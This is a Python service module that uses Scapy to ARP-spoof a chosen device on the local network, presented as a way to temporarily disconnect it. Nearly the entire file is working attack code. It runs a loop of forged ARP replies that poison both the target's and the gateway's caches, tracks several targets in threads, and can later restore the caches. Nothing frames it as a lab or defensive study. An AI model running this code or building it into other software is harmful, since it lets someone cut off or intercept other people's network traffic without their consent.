"""
ARP Spoofing service using Scapy.
Allows temporarily disconnecting a target device from the network.
"""
import threading
import time

from scapy.all import ARP, Ether, sendp, conf

from services.network import get_local_subnet

# Suppress Scapy warnings
conf.verb = 0

# Dict of active spoofing threads: { target_ip: { "thread": Thread, "stop": Event, "mac": str } }
_active_spoofs: dict = {}
_lock = threading.Lock()


def _get_gateway_ip() -> str:
    """Derive gateway IP from the local subnet (assumes .1)."""
    subnet = get_local_subnet()  # e.g. "192.168.11.0/24"
    prefix = subnet.rsplit(".", 1)[0]  # "192.168.11"
    return f"{prefix}.1"


def _get_gateway_mac(gateway_ip: str) -> str:
    """Get the real MAC address of the gateway using ARP request."""
    from scapy.all import srp

    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gateway_ip),
        timeout=3,
        verbose=False,
    )
    if ans:
        return ans[0][1].hwsrc
    raise RuntimeError(f"Could not resolve gateway MAC for {gateway_ip}")


def _get_local_mac() -> str:
    """Get this machine's MAC address."""
    from scapy.all import get_if_hwaddr
    return get_if_hwaddr(conf.iface)


def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str, stop_event: threading.Event):
    """
    Continuously send fake ARP replies to both the target and the gateway.
    This makes the target think we are the gateway, and vice versa.
    """
    local_mac = _get_local_mac()

    # Packet to target: "I am the gateway" (so target sends traffic to us instead)
    pkt_to_target = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=local_mac,
    )

    # Packet to gateway: "I am the target" (so gateway sends traffic to us instead)
    pkt_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        pdst=gateway_ip,
        psrc=target_ip,
        hwsrc=local_mac,
    )

    print(f"⚡ ARP spoofing started: {target_ip} ({target_mac})")

    while not stop_event.is_set():
        sendp(pkt_to_target, verbose=False)
        sendp(pkt_to_gateway, verbose=False)
        stop_event.wait(1)  # Send every 1 second

    print(f"🛑 ARP spoofing stopped: {target_ip}")


def _restore_arp(target_ip: str, target_mac: str, gateway_ip: str):
    """Send correct ARP replies to restore normal network operation."""
    try:
        gateway_mac = _get_gateway_mac(gateway_ip)

        # Tell the target the real gateway MAC
        restore_target = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=gateway_ip,
            hwsrc=gateway_mac,
        )

        # Tell the gateway the real target MAC
        restore_gateway = Ether(dst=gateway_mac) / ARP(
            op=2,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            psrc=target_ip,
            hwsrc=target_mac,
        )

        # Send multiple times to make sure it sticks
        for _ in range(5):
            sendp(restore_target, verbose=False)
            sendp(restore_gateway, verbose=False)
            time.sleep(0.2)

        print(f"✅ ARP restored for {target_ip}")
    except Exception as e:
        print(f"⚠️ Failed to restore ARP for {target_ip}: {e}")


def start_spoof(target_ip: str, target_mac: str) -> bool:
    """Start ARP spoofing a target device. Returns True if started successfully."""
    with _lock:
        if target_ip in _active_spoofs:
            return False  # Already being spoofed

        gateway_ip = _get_gateway_ip()
        stop_event = threading.Event()

        thread = threading.Thread(
            target=_spoof_loop,
            args=(target_ip, target_mac, gateway_ip, stop_event),
            daemon=True,
        )
        thread.start()

        _active_spoofs[target_ip] = {
            "thread": thread,
            "stop": stop_event,
            "mac": target_mac,
            "gateway_ip": gateway_ip,
            "started_at": time.time(),
        }
        return True


def stop_spoof(target_ip: str) -> bool:
    """Stop ARP spoofing and restore the target's ARP table. Returns True if stopped."""
    with _lock:
        entry = _active_spoofs.pop(target_ip, None)

    if entry is None:
        return False  # Not being spoofed

    entry["stop"].set()
    entry["thread"].join(timeout=5)

    _restore_arp(target_ip, entry["mac"], entry["gateway_ip"])
    return True


def get_active_spoofs() -> list[dict]:
    """Return a list of currently spoofed targets."""
    with _lock:
        return [
            {"ip": ip, "mac": info["mac"], "started_at": info["started_at"]}
            for ip, info in _active_spoofs.items()
        ]
